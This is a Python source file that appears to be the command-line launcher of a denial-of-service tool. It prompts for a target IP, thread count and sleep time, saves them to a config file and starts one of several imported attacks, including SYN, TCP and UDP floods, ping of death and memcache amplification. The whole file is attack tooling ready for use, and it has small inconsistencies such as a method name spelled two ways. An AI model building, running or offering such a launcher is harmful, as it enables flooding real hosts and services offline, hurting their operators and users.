from scripts.layer_3.LemonSqueezy import LemonSqueezy
from scripts.layer_3.ping_of_death import PingOfDeath
from scripts.layer_4.syn_flood import SynFlood
from scripts.layer_4.tcp_flood import TCP
from scripts.layer_4.udp_flood import UDP
from scripts.layer_4.minecraft import Minecraft
from scripts.layer_7.http_flood import HttpAttack
from scripts.layer_7.memcache import MemCache
from prompt_toolkit import PromptSession
from prompt_toolkit.completion import NestedCompleter
from prompt_toolkit.history import InMemoryHistory
from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
from prompt_toolkit.validation import Validator, ValidationError
from prompt_toolkit.styles import Style
from url_handler import UrlHandler
from colorama import Fore
from logger import Logger
from debug import Debug
import os.path
import inspect
import json
import re
import time

NOTE = Fore.BLUE + "[NOTE] " + Fore.WHITE
INFO = Fore.MAGENTA + "[INFO] " + Fore.WHITE
WARN = Fore.YELLOW + "[WARN] " + Fore.WHITE
ERROR = Fore.RED + "[ERROR] " + Fore.WHITE

styles = {
    '': '#ff0066',
    'ip': '#Fffb00', 
    'threads_num': '#Fffb00',
    'sleep_time': '#Fffb00',
    'pound': '#2596be',
    'rprompt': 'bg:#Ff00fd #ffffff',
}

style = Style.from_dict(styles)

class HostHandle:

    def __init__(self, method):

        self.ip = None
        self.threads_num = None
        self.sleep_time = None

        if method in {
            'Lemonsqueezy',
            'ping of death',
            'syn flood',
            'tcp flood',
            'udp flood',
            'minecraft',
            'memcache',
        }:
            

#==================================================================================================================================#
            

            ip_input_message = [
                ('class:IP', 'IP'),
                ('class:pound', ': '),
            ]

            ip = options(ip_input_message, rprompt=get_required, validator=IPValidator())
            self.ip = ip

            threads_num_input_message = [
                ('class:threads_num', 'Enter number of threads'),
                ('class:pound', ': '),
            ]

            threads_num = options(threads_num_input_message, default='5')
            self.threads_num = int(threads_num)

            sleep_time_input_message = [
                ('class:sleep_time', 'specify sleep time'),
                ('class:pound', ': '),
            ]

            sleep_time_ = options(sleep_time_input_message, default='1')

            if sleep_time_ == 'None' or sleep_time_ == 'none' or sleep_time_ == 'NONE' or sleep_time_ == 0 or sleep_time_ == '0' or sleep_time_.strip() == '':

                sleep_time = None

            else:

                sleep_time = int(sleep_time_)

            self.sleep_time = sleep_time

            self.config = {

                "HOST" : self.ip,

                "THREADS" : self.threads_num,

                "SLEEP" : self.sleep_time,
            }


#==================================================================================================================================#
            

            if method == "LemonSqueezy":
                self.attack_by_method(LemonSqueezy)

            elif method == "ping of death":
                self.attack_by_method(PingOfDeath)

            elif method == "syn flood":
                self.attack_by_method(SynFlood)

            elif method == "tcp flood":
                self.attack_by_method(TCP)

            elif method == "udp flood":
                self.attack_by_method(UDP)

            elif method == "minecraft":
                self.attack_by_method(Minecraft)

            elif method == "memcache":
                self.attack_by_method(MemCache)

    def attack_by_method(self, method_name):

        json_object = json.dumps(self.config, indent=4)

        with open(os.path.dirname(inspect.getsourcefile(method_name)) + "\\attack_config.json", "w") as outfile:
            outfile.write(json_object)

        method_name().get_info()

        input(Fore.MAGENTA + "Press Enter when you're ready!" + Fore.WHITE)

        method_name().attack()


class IPValidator(Validator):
    def validate(self, document):
        Logger(__file__)

        _IP = document.text

        if re.match(r'^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$', _IP):
            pass

        else:
            raise ValidationError(message="not a valid url!")
        
def options(*args, **kwargs):
    Logger(__file__)

    session = PromptSession()

    option = session.prompt(*args, **kwargs, style=style, complete_in_thread=True, auto_suggest=AutoSuggestFromHistory())

    return option.strip()
    
def get_required():
    Logger(__file__)
    return '*required'
